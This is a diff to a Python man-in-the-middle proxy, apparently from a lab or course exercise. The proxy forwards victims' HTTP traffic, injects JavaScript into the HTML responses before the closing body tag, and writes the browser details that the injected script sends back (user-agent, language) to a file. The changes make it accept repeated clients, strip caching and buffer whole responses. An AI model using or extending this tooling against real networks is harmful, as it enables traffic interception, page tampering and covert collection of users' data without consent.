@@ -28,6 +28,7 @@ def parse_and_log_client_data(request_data):
         if language:
             f.write("Language: {}\n".format(unquote(language.group(1))))
         f.write("\n")
+        print("Client data logged to info2.txt.")
 
 def get_destination_host_port(request_data):
     """
@@ -75,8 +76,8 @@ def inject_javascript(response_data):
         </script>
     """
     response_data = modify_content_length_header(response_data, len(js_code))
-    js_code = js_code.replace("{proxy_ip}", PROXY_IP)
-    js_code = js_code.replace("{proxy_port}", str(80))
+    js_code = js_code.replace("{proxy_ip}", "127.0.0.1") #PROXY_IP
+    js_code = js_code.replace("{proxy_port}", str(8080))
 
     # Find the position of the </body> tag
     body_end_index = response_data.lower().find("</body>")
@@ -99,8 +100,10 @@ def inject_javascript(response_data):
 
 def handle_active_client(client_socket):
     request = client_socket.recv(8192)
-    #request = request.replace(b'\r\n\r\n', b'\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n')
+    request = request.replace(b'\r\n\r\n', b'\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n')
     request = request.decode('utf-8')
+
+    print("Received request")
 
      # Handle the GET request with client data
     if '/?user-agent=' in request:
@@ -115,19 +118,33 @@ def handle_active_client(client_socket):
     server_socket.connect((host, 80))
     server_socket.send(request.encode('utf-8'))
 
-    while True:
-        response = server_socket.recv(16384).decode('utf-8')
-        if response:
-            #if 'text/html' in response:
-            response = inject_javascript(response)
-            client_socket.send(response.encode('utf-8'))
-            print("Response sent to client.")
-            print("Response is:\n{}".format(response))
-        else:
-            break
 
-    client_socket.close()
-    server_socket.close()
+    response_data = b""
+    c = 0
+    server_socket.settimeout(5)
+    while True:
+        try:
+            chunk = server_socket.recv(8192) 
+            print(c)
+            c += 1
+            print('Len of chunk: ',len(chunk) )
+            # Check if the end of the HTML content has been reached
+            if len(chunk) == 0:
+                break
+            response_data += chunk
+        except socket.timeout:
+            break
+    print("Receieved all chunks")
+    response = response_data.decode('utf-8')
+    if response:
+        #if 'text/html' in response:
+        response = inject_javascript(response)
+        client_socket.send(response.encode('utf-8'))
+        print("Response sent to client.")
+        print("Response is:\n{}".format(response))
+
+    #client_socket.close()
+    #server_socket.close()
 
 
 
@@ -140,13 +157,14 @@ def proxy_active(listening_ip, listening_port):
     server.listen(5)
     print("Proxy server listening on {}:{}".format(PROXY_IP_INTERFACE, listening_port))
 
-    client_socket, client_address = server.accept()
-    if client_address[0] != listening_ip:
-        print("Invalid client IP. Exiting...")
-        exit(1)
-    print("Client connected from {}:{}".format(client_address[0], client_address[1]))
-    client_thread = threading.Thread(target=handle_active_client, args=(client_socket, ))
-    client_thread.start()
+    while True:
+        client_socket, client_address = server.accept()
+        if client_address[0] != listening_ip:
+            print("Invalid client IP. Exiting...")
+            exit(1)
+        print("Client connected from {}:{}".format(client_address[0], client_address[1]))
+        client_thread = threading.Thread(target=handle_active_client, args=(client_socket, ))
+        client_thread.start()
 
 
 def proxy_passive(listening_ip, listening_port):
